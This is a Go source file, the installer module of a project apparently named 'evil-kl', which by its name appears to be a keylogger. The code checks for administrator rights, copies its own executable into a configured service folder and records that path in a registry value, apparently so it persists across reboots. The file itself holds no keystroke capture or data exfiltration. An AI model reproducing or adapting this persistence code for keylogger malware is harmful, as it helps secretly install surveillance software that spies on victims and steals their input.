package installer

import (
	"fmt"
	"io"
	"os"

	logger "github.com/dm1trypon/easy-logger"
	"github.com/dm1trypon/evil-kl/internal/app/config"
	"github.com/dm1trypon/evil-kl/internal/pkg/registry"
	"golang.org/x/sys/windows"
)

/*
Create <Installer> - init Installer structure
	Returns <*Installer>:
		1. Structure pointer
	Args:
		1. cfg <config.Cfg> - service's config
*/
func (i *Installer) Create(cfg config.Cfg) *Installer {
	i = &Installer{
		lc:           "INSTALLER",
		registryInst: new(registry.Registry).Create(),
		cfg:          cfg,
		chCritError:  make(chan bool, 1),
	}

	return i
}

// Run <Installer> - starts the installation process
func (i *Installer) Run() {
	if i.isInstalled() {
		logger.InfoJ(i.lc, "Service already installed")
		return
	}

	if !i.isRoot() {
		logger.InfoJ(i.lc, "User is not root")
		i.chCritError <- true
		return
	}

	if err := os.MkdirAll(i.cfg.Installer.ServicePath, os.ModePerm); err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Error make service's temp's directory: ", err.Error()))
		i.chCritError <- true
		return
	}

	path := fmt.Sprint(i.cfg.Installer.ServicePath, i.cfg.Installer.ServiceName)

	if err := i.copyFiles(os.Args[0], path); err != nil {
		i.chCritError <- true
		return
	}

	if err := i.registryInst.SetStringValue(i.cfg.Installer.RegPath, i.cfg.Installer.RegName, path); err != nil {
		i.chCritError <- true
		return
	}

	i.chCritError <- false
}

/*
GetChCritError <Installer> - getting error channel
	Returns <<-chan bool>:
		1. Channel error
*/
func (i *Installer) GetChCritError() <-chan bool {
	return i.chCritError
}

// CopyFiles method clone the file
func (i *Installer) copyFiles(sourcePath string, copyPath string) error {
	srcFile, err := os.Open(sourcePath)
	if err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Error opening file: ", err.Error()))
		return err
	}

	defer srcFile.Close()

	destFile, err := os.Create(copyPath)
	if err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Error creating file: ", err.Error()))
		return err
	}

	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Error copying file data: ", err.Error()))
		return err
	}

	if err := destFile.Sync(); err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("An error occurred while fixing the current",
			" contents of the file in stable storage: ", err.Error()))
		return err
	}

	return nil
}

/*
isInstalled <Installer> - service installation check
	Returns <bool>:
		1. Is installed
*/
func (i *Installer) isInstalled() bool {
	value, err := i.registryInst.GetStringValue(i.cfg.Installer.RegPath, i.cfg.Service.Name)
	if err != nil {
		return false
	}

	if value != fmt.Sprint(i.cfg.Installer.ServicePath, i.cfg.Installer.ServiceName) {
		return false
	}

	return true
}

/*
isRoot <Installer> - root check
	Returns <bool>:
		1. Is root
*/
func (i *Installer) isRoot() bool {
	var sid *windows.SID

	// Although this looks scary, it is directly copied from the
	// official windows documentation. The Go API for this is a
	// direct wrap around the official C++ API.
	// See https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-checktokenmembership
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Failed to allocate and init SID: ", err.Error()))
		return false
	}

	// This appears to cast a null pointer so I'm not sure why this
	// works, but this guy says it does and it Works for Me™:
	// https://github.com/golang/go/issues/28804#issuecomment-438838144
	token := windows.Token(0)

	member, err := token.IsMember(sid)
	if err != nil {
		logger.ErrorJ(i.lc, fmt.Sprint("Failed getting the member's SID: ", err.Error()))
		return false
	}

	return member
}
